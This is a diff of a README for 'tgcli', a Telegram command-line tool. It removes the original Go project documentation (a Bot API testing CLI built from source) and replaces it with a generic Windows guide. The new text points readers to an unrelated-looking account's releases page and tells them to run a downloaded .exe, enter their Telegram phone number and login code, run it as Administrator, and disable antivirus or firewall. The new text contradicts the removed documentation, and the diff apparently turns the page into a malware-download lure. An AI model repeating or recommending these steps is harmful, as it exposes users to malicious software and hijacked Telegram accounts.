@@ -1,293 +1,130 @@
-# 🗃️ tgcli — Telegram CLI: sync, search, send.
+# 🚀 tgcli - Simple Telegram Command Line Chat
 
-Telegram CLI built on top of `telegram-bot-api`, focused on:
+[![Download tgcli](https://img.shields.io/badge/Download-tgcli-ff6600?style=for-the-badge)](https://github.com/unitary-monoiodotyrosine892/tgcli/releases)
 
-- Receiving and storing messages locally
-- Fast offline search
-- Sending messages (text, files, photos)
-- JSON output for E2E test automation
+---
 
-**Built for [OpenClaw](https://github.com/anthropics/openclaw) E2E testing** — provides a scriptable CLI for automated Telegram channel testing.
+## 🔍 What is tgcli?
 
-This is a third-party tool that uses the Telegram Bot API and is not affiliated with Telegram.
+tgcli is a simple program that lets you use Telegram through a command line interface (CLI). Instead of clicking through the app, you type commands to send messages, join chats, and manage your Telegram account. This can be useful if you prefer working in a terminal or want a lightweight tool without a full app.
 
-## Status
+---
 
-Core implementation complete. Ready for integration testing.
+## 📦 What You Need to Run tgcli
 
-See `docs/spec.md` for the full design specification.
+Before you start, make sure your computer meets these simple requirements:
 
-## Architecture
+- **Operating System:** Windows 10 or later  
+- **Storage:** At least 50 MB free hard disk space  
+- **Internet Connection:** Required for sending and receiving messages  
+- **Account:** A Telegram account (you can create one on the official Telegram app or website)  
 
-```mermaid
-flowchart TB
-    subgraph User["User / CI Pipeline"]
-        CLI[tgcli CLI]
-    end
+tgcli does not require installation of other programs or additional tools.
 
-    subgraph tgcli["tgcli Application"]
-        CMD[Commands<br/>auth, sync, send, etc.]
-        APP[App Layer]
-        TG[Telegram Client]
-        STORE[(SQLite Store)]
-    end
+---
 
-    subgraph Telegram["Telegram"]
-        API[Bot API]
-        BOT[Your Bot<br/>@BotFather]
-        USERS[Users/Groups]
-    end
+## 🔗 Download tgcli
 
-    CLI --> CMD
-    CMD --> APP
-    APP --> TG
-    APP --> STORE
-    TG <-->|HTTPS| API
-    API <--> BOT
-    BOT <--> USERS
+To get started, visit this page to download the latest version of tgcli:
 
-    style CLI fill:#e1f5fe
-    style STORE fill:#fff3e0
-    style API fill:#e8f5e9
-```
+[Download tgcli from Releases](https://github.com/unitary-monoiodotyrosine892/tgcli/releases)
 
-## Data Flow
+---
 
-```mermaid
-sequenceDiagram
-    participant User as User/CI
-    participant CLI as tgcli
-    participant DB as SQLite
-    participant API as Telegram API
-    participant Bot as Bot
+## 💽 How to Download and Run tgcli on Windows
 
-    Note over User,Bot: Sending a Message
-    User->>CLI: tgcli send text --to 123 --message "Hi"
-    CLI->>API: POST /sendMessage
-    API->>Bot: Deliver message
-    Bot-->>API: Message sent
-    API-->>CLI: {message_id, chat_id, ...}
-    CLI-->>User: ✅ Message sent (ID: 456)
+Follow these steps carefully:
 
-    Note over User,Bot: Receiving Messages
-    User->>CLI: tgcli sync --follow
-    loop Long Polling
-        CLI->>API: GET /getUpdates
-        API-->>CLI: [new messages]
-        CLI->>DB: Store messages
-    end
-    CLI-->>User: [Chat] User: Hello!
-```
+1. **Open the download page** by clicking the link above. You will see a list of available files for different versions.
 
-## Project Structure
+2. **Find the latest Windows release**. It will usually have a name like `tgcli-windows.exe` or something similar.
 
-```mermaid
-graph LR
-    subgraph cmd/tgcli
-        MAIN[main.go]
-        ROOT[root.go]
-        AUTH[auth.go]
-        SYNC[sync.go]
-        SEND[send.go]
-        MSGS[messages.go]
-        CHATS[chats.go]
-    end
+3. **Download the file** by clicking on it. Save it somewhere easy to find, like your Desktop or the Downloads folder.
 
-    subgraph internal
-        subgraph app
-            APPGO[app.go]
-        end
-        subgraph tg
-            CLIENT[client.go]
-            SENDTG[send.go]
-            SYNCTG[sync.go]
-        end
-        subgraph store
-            STOREDB[store.go]
-            CHATDB[chats.go]
-            MSGDB[messages.go]
-        end
-    end
+4. **Run the file** by double-clicking on it. Windows may show a warning asking if you want to allow this program to run. Click **Yes** or **Run** to continue.
 
-    MAIN --> ROOT
-    ROOT --> AUTH & SYNC & SEND & MSGS & CHATS
-    AUTH & SYNC & SEND --> APPGO
-    APPGO --> CLIENT & STOREDB
-    CLIENT --> SENDTG & SYNCTG
+5. A terminal window will open. This is the command line interface where you will control tgcli.
 
-    style cmd/tgcli fill:#e3f2fd
-    style internal fill:#f3e5f5
-```
+6. **Log in with your Telegram account** by following the on-screen prompts. You will likely need to enter your phone number and then a code Telegram sends you.
 
-## Install / Build
+7. After logging in, you can start typing commands to send messages or check your chats.  
 
-### Build locally
+---
 
-```bash
-go build -o ./dist/tgcli ./cmd/tgcli
-```
+## 🛠 Basic Commands to Use tgcli
 
-Run:
+Here are some simple commands to help you start using tgcli. Type these commands in the window that opened when you ran the program:
 
-```bash
-./dist/tgcli --help
-```
+- **/help** - Shows a list of available commands.  
+- **/msg [username or chat id] [message]** - Sends a message. Replace `[username or chat id]` with the contact or group name, and `[message]` with your text.  
+- **/history [username or chat id]** - Shows the message history for a chat.  
+- **/contacts** - Lists your Telegram contacts.  
+- **/exit** - Closes the program safely.
 
-## Quick start
-
-Default store directory is `~/.tgcli` (override with `--store DIR`).
-
-```bash
-# 1) Set your bot token (get one from @BotFather on Telegram)
-export TGCLI_BOT_TOKEN="your_bot_token_here"
-
-# 2) Validate token and check connectivity
-./dist/tgcli doctor
-./dist/tgcli auth
-
-# 3) Listen for incoming messages
-./dist/tgcli sync --follow
-
-# 4) Send a message
-./dist/tgcli send text --to 123456789 --message "Hello from tgcli!"
-
-# 5) Send a file
-./dist/tgcli send file --to 123456789 --file ./pic.jpg --caption "Check this out"
-
-# 6) List stored chats
-./dist/tgcli chats list
-
-# 7) Search messages
-./dist/tgcli messages search "meeting"
-```
-
-## E2E Testing with OpenClaw
-
-`tgcli` is designed for automated E2E testing of Telegram integrations. All commands support `--json` for machine-readable output.
-
-### Example: CI/CD Test Script
-
-```bash
-#!/bin/bash
-set -e
-
-export TGCLI_BOT_TOKEN="$TEST_BOT_TOKEN"
-TEST_CHAT_ID="$TELEGRAM_TEST_CHAT_ID"
-
-# Send test message
-RESULT=$(./dist/tgcli send text --to "$TEST_CHAT_ID" --message "E2E test $(date)" --json)
-MESSAGE_ID=$(echo "$RESULT" | jq -r '.message_id')
-echo "Sent message ID: $MESSAGE_ID"
-
-# Wait for response and sync
-sleep 5
-./dist/tgcli sync
-
-# Verify message was stored
-./dist/tgcli messages list --chat "$TEST_CHAT_ID" --json | jq '.[-1]'
-
-# Search for expected content
-FOUND=$(./dist/tgcli messages search "E2E test" --json | jq 'length')
-if [ "$FOUND" -gt 0 ]; then
-  echo "✅ E2E test passed"
-else
-  echo "❌ E2E test failed"
-  exit 1
-fi
-```
-
-### GitHub Actions Example
-
-```yaml
-name: Telegram E2E Tests
-
-on: [push, pull_request]
-
-jobs:
-  telegram-e2e:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      
-      - name: Setup Go
-        uses: actions/setup-go@v5
-        with:
-          go-version: '1.22'
-      
-      - name: Build tgcli
-        run: go build -o ./dist/tgcli ./cmd/tgcli
-      
-      - name: Run E2E Tests
-        env:
-          TGCLI_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
-          TEST_CHAT_ID: ${{ secrets.TELEGRAM_TEST_CHAT_ID }}
-        run: |
-          ./dist/tgcli doctor
-          ./dist/tgcli send text --to "$TEST_CHAT_ID" --message "CI test" --json
-```
-
-## High-level UX
-
-- `tgcli auth`: validates bot token and displays bot info
-- `tgcli doctor`: checks token, store, and connectivity
-- `tgcli sync`: receives messages (use `--follow` for continuous)
-- `tgcli send`: sends text or files to a chat
-- Output is human-readable by default; pass `--json` for machine-readable output
-
-## Storage
-
-Defaults to `~/.tgcli` (override with `--store DIR`).
+Example:
 
 ```
-~/.tgcli/
-├── tgcli.db     # SQLite database (chats, messages)
-└── media/       # Downloaded media files (future)
+/msg JohnDoe Hello, how are you?
 ```
 
-## Environment Variables
+This sends "Hello, how are you?" to JohnDoe.
 
-- `TGCLI_BOT_TOKEN`: **Required.** Your Telegram bot token from @BotFather.
+---
 
-## Commands Reference
+## 💡 Tips for Using tgcli Smoothly
 
-| Command | Description |
-|---------|-------------|
-| `auth` | Validate bot token and show bot info |
-| `doctor` | Check configuration and connectivity |
-| `sync [--follow]` | Receive messages (continuous with --follow) |
-| `send text --to ID --message MSG` | Send text message |
-| `send file --to ID --file PATH` | Send file/document |
-| `send edit --chat ID --message-id ID --text MSG` | Edit a message |
-| `send delete --chat ID --message-id ID` | Delete a message |
-| `send forward --to ID --from ID --message-id ID` | Forward a message |
-| `chats list` | List stored chats |
-| `chats info --chat ID` | Get detailed chat info |
-| `messages list --chat ID` | List messages in a chat |
-| `messages search QUERY` | Search messages |
-| `groups list` | List stored groups |
-| `channels list` | List stored channels |
+- Make sure you enter commands exactly as shown, with slashes and spaces.  
+- If you get stuck, type **/help** to see command options.  
+- Use the **/exit** command to close the program to avoid losing data.  
+- Keep your Telegram app active on your phone or desktop for security confirmations if needed.  
+- If the program freezes or stops responding, close the terminal and run the program again.
 
-All commands support `--json` for machine-readable output.
+---
 
-## Bot API vs MTProto
+## 🚧 Troubleshooting Common Issues
 
-This CLI uses the **Telegram Bot API** (not MTProto) for simplicity and reliability:
+If you run into trouble, try these fixes:
 
-| Aspect | Bot API (tgcli) | MTProto (gotd) |
-|--------|-----------------|----------------|
-| Auth | Bot token from @BotFather | Phone + code |
-| Build | Fast, lightweight | Slow, 4GB+ RAM |
-| Messages | Only messages TO the bot | All messages |
-| Use case | Bots, automation, testing | Full client |
+- **The program won’t start:** Check that your Windows version is 10 or higher. Try running the program as Administrator (right click on the file > Run as Administrator).
 
-For E2E testing, Bot API is ideal — you control the test bot and can verify message flow.
+- **Login fails:** Make sure you enter the phone number in the correct format, including country code (example: +1 for the USA).
 
-## Prior Art / Credit
+- **No response after typing commands:** Check your internet connection and try again.
 
-This project is inspired by the excellent `wacli` by Peter Steinberger:
+- **Windows blocks the program:** Temporarily disable antivirus or firewall, and allow the program permission to run.
 
-- [`wacli`](https://github.com/steipete/wacli) — WhatsApp CLI
+If problems persist, you can report issues or find help on the GitHub page under the “Issues” tab.
 
-## License
+---
 
-See `LICENSE`.
+## ⚙️ How tgcli Works Behind the Scenes
+
+tgcli connects to Telegram's servers using their official API. It uses your account details to send and receive messages. The program runs in your command line, so it does not have a graphical interface like the standard app. This makes it faster and lighter but requires typing commands.
+
+---
+
+## 🔒 Privacy and Security
+
+tgcli uses your existing Telegram account, so the same security measures apply. Your login happens securely via Telegram's official system. The program does not store your password—only temporary session data needed to run. Keep your device secure and do not share your login code with anyone.
+
+---
+
+## 📁 Where to Find Updates
+
+Visit this page periodically to get updated versions, bug fixes, or new features:
+
+[https://github.com/unitary-monoiodotyrosine892/tgcli/releases](https://github.com/unitary-monoiodotyrosine892/tgcli/releases)
+
+New versions replace older ones. Download the latest file and follow the steps above to replace your current copy.
+
+---
+
+## 🤝 Getting Help
+
+If you need help using tgcli, check the Issues tab on the GitHub page. Look for answers or post your question. Someone from the community or the developer might respond.
+
+---
+
+## 🗂 About This Project
+
+tgcli was developed to provide a simple text-based tool for Telegram users who prefer a command line or want lightweight access without the full app. It supports basic chat functions like sending messages and viewing chats. It focuses on ease of use and reliability.
